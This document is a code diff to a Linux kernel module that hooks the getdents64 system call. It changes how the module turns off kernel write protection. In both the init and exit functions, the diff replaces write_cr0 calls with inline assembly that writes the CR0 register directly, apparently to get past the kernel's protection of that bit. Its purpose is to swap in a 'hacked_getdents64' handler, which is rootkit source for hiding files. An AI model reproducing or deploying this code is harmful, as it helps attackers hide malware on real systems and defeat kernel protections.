@@ -85,9 +85,11 @@ static int __init syscall_hooking_init(void)
 	}
 	sys_call_table = (void **)sym_addr;
 	orig_getdents64 = (asmlinkage long (*)(const struct pt_regs *))sys_call_table[__NR_getdents64];
-	write_cr0(read_cr0() & ~(1UL << 16));
+	unsigned long no_wp_bit = read_cr0() & ~(1UL << 16);
+	asm volatile("mov %0,%%cr0": "+r" (no_wp_bit) : : "memory");
 	sys_call_table[__NR_getdents64] = hacked_getdents64;
-	write_cr0(read_cr0() | (1UL << 16));
+	unsigned long yes_wp_bit = read_cr0() | (1UL << 16);
+	asm volatile("mov %0,%%cr0": "+r" (yes_wp_bit) : : "memory");
 	
 	printk(KERN_INFO "Syscall_hooker: Target acquired. Address: <REDACTED>\n");
 	
@@ -96,9 +98,11 @@ static int __init syscall_hooking_init(void)
 
 static void __exit syscall_hooking_exit(void)
 {
-	write_cr0(read_cr0() & ~(1UL << 16));
+	unsigned long no_wp_bit = read_cr0() & ~(1UL << 16);
+	asm volatile("mov %0,%%cr0": "+r" (no_wp_bit) : : "memory");
 	sys_call_table[__NR_getdents64] = orig_getdents64;
-	write_cr0(read_cr0() | (1UL << 16));
+	unsigned long yes_wp_bit = read_cr0() | (1UL << 16);
+	asm volatile("mov %0,%%cr0": "+r" (yes_wp_bit) : : "memory");
 	printk(KERN_INFO "Syscall_hooker: Mission complete!\n");
 }
 
